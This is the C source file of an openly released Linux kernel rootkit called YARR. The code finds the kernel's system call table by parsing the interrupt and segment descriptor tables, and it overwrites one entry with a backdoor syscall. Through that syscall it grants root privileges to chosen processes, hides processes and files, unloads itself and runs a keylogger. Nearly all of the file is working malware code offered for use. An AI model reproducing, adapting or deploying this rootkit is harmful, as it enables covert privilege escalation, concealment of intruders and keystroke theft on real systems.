/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <linux/syscalls.h>

#include "syscall.h"
#include "debug.h"
#include "interrupt.h"
#include "funcs.h"
#include "types.h"
#include "giveprivs.h"
#include "hideproc.h"
#include "hidefile.h"
#include "hide.h"
#include "keylog.h"

unsigned long *old_syscall = NULL;

/***
 * Yarr system call that will be installed by installSyscall. It will gives us
 * the possibility to call it and ask it to do something (check funcs.h to
 * know what it offers).
 *
 _* @code: One of the codes defined in funcs.h that will tell yarrSyscall() what
 *        we want it to do.
 * @data: Depends on code, it will point to the data needed to accomplish what
 *        you want it to do.
 */
asmlinkage long yarrSyscall(yarrOps code, const syscallData __user *data) {
	int res = -1;

	switch (code) {
		case GIVE_PRIVILEGES:
			res = givePrivileges(data->pid);
			break;

		case HIDE_PROCESS:
			res = hideProc(data->pid);
			break;

		case STOP_HIDE_PROCESS:
			res = stopHideProc(data->pid);
			break;

		case HIDE_FILE:
			res = hideFile(data->filename);
			break;

		case STOP_HIDE_FILE:
			res = stopHideFile(data->filename);
			break;

		case UNLOAD_YARR:
			res = unloadMe();
			break;

		case KEYLOG:
			print_scancodes();
			print_keys();
			res = 0;
			break;

		default:
			debug("YARR! WE ARE MIGHTY PIRATES WITHOUT OPERATION %d!.\n", code);
	}

	return res;
}

unsigned long **getSyscallTable(void) {
	struct desc_ptr idtr, gdtr;
	struct desc_struct *idt_entry, *gdt_entry;
	u32 gate_offset, gate_base;
	u8 *syscall_desc, *call_offset;

	// Get both IDT and GDT.
	store_idt(&idtr);
	store_gdt(&gdtr);

	// Take the interrupt descriptor for 0x80 (Linux system_call).
	idt_entry = (struct desc_struct *)idtr.address + LINUX_SYSCALL_VECTOR;
	gdt_entry = (struct desc_struct *)gdtr.address + gate_segment(*idt_entry);
	gate_offset = (u32)gate_offset(*idt_entry);
	gate_base = (u32)get_desc_base(gdt_entry);
	syscall_desc = (u8 *)(gate_base + gate_offset);

	// Search inside it the first call instruction. This can change in the
	// future, right now the first call if the one that jumps into the
	// corresponding system call based on eax, it has this form:
	//
	// \xff\x14\x85\x??\x??\x??\x??
	//
	// The \x?? bytes are the sys_call_table. If one day Linux hackers decide
	// to modify syscall_call inside arch/x86/kernel/entry_32.S probably this
	// should change.
	call_offset = search_call_opcode(syscall_desc);
	return *(unsigned long ***)(call_offset + 3);
}

int getSyscallTableSize(void) {
    struct desc_ptr idtr, gdtr;
    struct desc_struct *idt_entry, *gdt_entry;
    u32 gate_offset, gate_base;
    u8 *syscall_desc, *cmpl_offset;

    // Get both IDT and GDT.
    store_idt(&idtr);
    store_gdt(&gdtr);

    // Take the interrupt descriptor for 0x80 (Linux system_call).
    idt_entry = (struct desc_struct *)idtr.address + LINUX_SYSCALL_VECTOR;
    gdt_entry = (struct desc_struct *)gdtr.address + gate_segment(*idt_entry);
    gate_offset = (u32)gate_offset(*idt_entry);
    gate_base = (u32)get_desc_base(gdt_entry);
    syscall_desc = (u8 *)(gate_base + gate_offset);

    cmpl_offset = search_cmpl_opcode(syscall_desc);
    return *(int *)(cmpl_offset + 1);
}

int installSyscall(unsigned int n) {
	unsigned long **sys_call_table, *yarrSyscall_addr;

	// TODO: We can try to insert the new syscall at the end of the
	// sys_call_table and make it grow, but this needs time to study it because
	// it is not as easy as it seems. If we do that, we need to change every
	// reference to the sys_call_table length in the kernel, the kernel doesn't
	// use a variable with this length, it just hardcode it in every place it
	// needs it, for example at system_call(), there are a cmp/test
	// instructions that checks that the syscall requested is in range so we
	// would need to patch the cmp instruction (the one that has the length).

	// Check that we are in sys_call_table range.
	if (n < 0 || n >= getSyscallTableSize())
		return -1;

	// Get the sys_call_table, save the older syscall and change it for our
	// syscall.
	sys_call_table = getSyscallTable();
	old_syscall = sys_call_table[n];
	yarrSyscall_addr = (unsigned long *)yarrSyscall;
	kmemcpy(&sys_call_table[n], &yarrSyscall_addr, sizeof(unsigned long *));
	return 0;
}

int uninstallSyscall(unsigned int n) {
	unsigned long **sys_call_table;

	// Get the sys_call_table and override the requested index position with
	// the function previously saved (when installSyscall() was executed... it
	// is being executed, right?).
	sys_call_table = getSyscallTable();
	kmemcpy(&sys_call_table[n], &old_syscall, sizeof(unsigned long *));
	return 0;
}

